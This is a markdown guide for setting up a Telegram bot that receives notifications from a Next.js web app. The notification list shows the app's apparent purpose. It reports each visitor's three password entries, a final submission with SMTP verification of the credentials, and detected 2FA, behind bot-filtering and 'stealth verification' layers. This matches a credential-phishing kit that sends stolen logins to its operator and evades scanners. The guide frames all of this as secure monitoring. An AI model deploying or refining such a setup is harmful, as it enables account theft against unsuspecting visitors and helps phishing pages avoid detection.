# 📱 Telegram Bot Setup Guide

## Quick Setup (5 minutes)

### Step 1: Create Telegram Bot

1. **Open Telegram** and search for `@BotFather`
2. Send command: `/newbot`
3. Follow prompts:
   - **Bot name:** `My Secure Monitor Bot` (or any name)
   - **Bot username:** `my_secure_monitor_bot` (must end with `_bot`)
4. **Copy the token** BotFather gives you (looks like: `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`)

### Step 2: Get Your Chat ID

1. **Start a chat** with your new bot:
   - Click the link BotFather gave you: `t.me/your_bot_username`
   - Click **"Start"** button
2. **Send any message** to your bot (e.g., "Hello")
3. **Get your Chat ID:**
   - Visit: `https://api.telegram.org/botYOUR_BOT_TOKEN/getUpdates`
   - Replace `YOUR_BOT_TOKEN` with your actual token
   - Look for `"id"` in the `"chat"` object (it's a number like `6507005533`)

### Step 3: Configure Environment Variables

1. **Create or edit `.env.local`** in your project root:

```env
# Telegram Configuration
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here
```

2. **Replace with your actual values:**
   - `your_bot_token_here` → Your bot token from BotFather
   - `your_chat_id_here` → Your chat ID from getUpdates

3. **Save the file**

4. **Restart your dev server:**
   ```bash
   # Stop server (Ctrl+C)
   npm run dev
   ```

### Step 4: Test Telegram Connection

Visit this URL to test:
```
http://localhost:3000/api/test/telegram
```

Or use curl:
```bash
curl http://localhost:3000/api/test/telegram
```

You should see a test message in your Telegram!

---

## Expected Messages

Once configured, you'll receive these messages in Telegram:

### 1. Security Layer Notifications (4 messages)
- 🔐 LAYER 1: BOT FILTER
- 🔐 LAYER 2: CAPTCHA
- 🔐 LAYER 3: BOT DETECTION DELAY
- 🔐 LAYER 4: STEALTH VERIFICATION

### 2. Password Entry Notifications (3 messages)
- 🔐 PASSWORD ENTRY 1
- 🔐 PASSWORD ENTRY 2
- 🔐 PASSWORD ENTRY 3

### 3. Final Submission (1-2 messages)
- 🔐 VALID VISITOR (initial entry)
- 🔐 FINAL SUBMISSION (with SMTP verification results)
- ⚠️ 2FA DETECTED (if 2FA is required)

**Total: ~8-9 messages per visitor**

---

## Troubleshooting

### Issue: "⚠️ Telegram not configured"

**Solution:**
1. Check `.env.local` file exists in project root
2. Verify no typos in variable names:
   - `TELEGRAM_BOT_TOKEN` (not `TELEGRAM_TOKEN`)
   - `TELEGRAM_CHAT_ID` (not `TELEGRAM_CHAT`)
3. **No quotes** around values:
   - ✅ Correct: `TELEGRAM_BOT_TOKEN=123456:ABC...`
   - ❌ Wrong: `TELEGRAM_BOT_TOKEN="123456:ABC..."`
4. Restart dev server completely

### Issue: "Unauthorized" error

**Solution:**
- Bot token is incorrect
- Copy the FULL token from BotFather (includes colon)
- Token format: `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`

### Issue: "Bad Request: chat not found"

**Solution:**
1. Make sure you sent `/start` to your bot first
2. Chat ID might be wrong - check `getUpdates` response again
3. If using a group, use group chat ID (negative number)

### Issue: No messages received

**Solution:**
1. Send `/start` to your bot again
2. Check if bot is blocked in Telegram
3. Verify chat ID is for personal chat (not group)
4. Test with `/api/test/telegram` endpoint

---

## Example .env.local File

```env
# Telegram Configuration
TELEGRAM_BOT_TOKEN=1234567890:ABCdefGHIjklMNOpqrsTUVwxyz1234567890
TELEGRAM_CHAT_ID=123456789

# Turnstile CAPTCHA (if using)
NEXT_PUBLIC_TURNSTILE_SITE_KEY=0x4AAAAAAAytVe...
TURNSTILE_SECRET_KEY=0x4AAAAAAAytVf...

# JWT Token Secret
TOKEN_SECRET=your-super-secret-jwt-key-change-this-in-production

# Base URL
NEXT_PUBLIC_BASE_URL=http://localhost:3000
```

---

## Security Notes

✅ **Telegram is secure:**
- All API calls use HTTPS (encrypted in transit)
- Bot messages are private to your chat ID
- No public access to messages
- Bot token stored in environment variables

✅ **Best practices:**
- Never commit `.env.local` to git
- Use different tokens for dev/production
- Rotate tokens periodically
- Keep chat ID private

---

## Quick Test

After setup, test with:

```bash
# Test endpoint
curl http://localhost:3000/api/test/telegram

# Or visit in browser:
http://localhost:3000/api/test/telegram
```

You should receive a test message in Telegram immediately!

---

**Need help?** Check the console logs for specific error messages.




